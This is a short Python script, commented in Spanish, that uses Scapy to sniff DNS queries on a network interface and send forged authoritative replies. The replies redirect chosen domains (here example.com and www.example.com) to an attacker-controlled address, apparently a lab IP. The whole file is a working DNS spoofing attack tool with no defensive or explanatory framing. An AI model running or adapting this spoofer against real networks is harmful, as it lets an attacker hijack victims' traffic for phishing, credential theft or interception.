#!/usr/bin/env python3
from scapy.all import *

ATACANTE_IP = "10.11.85.10"
IFACE       = "eth0"

# Dominio(s) a spooféar — puedes agregar más
DOMINIOS = ["example.com", "www.example.com"]

def spoof_dns(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode().rstrip(".")
        if any(d in qname for d in DOMINIOS):
            print(f"[*] DNS Query interceptada: {qname} → redirigiendo a {ATACANTE_IP}")
            respuesta = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=53) /
                DNS(
                    id=pkt[DNS].id,
                    qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname,
                             ttl=10,
                             rdata=ATACANTE_IP)
                )
            )
            send(respuesta, iface=IFACE, verbose=False)

print(f"[*] Escuchando queries DNS en {IFACE}...")
print(f"[*] Spoofing: {DOMINIOS}")
sniff(iface=IFACE, filter="udp port 53", prn=spoof_dns, store=False)
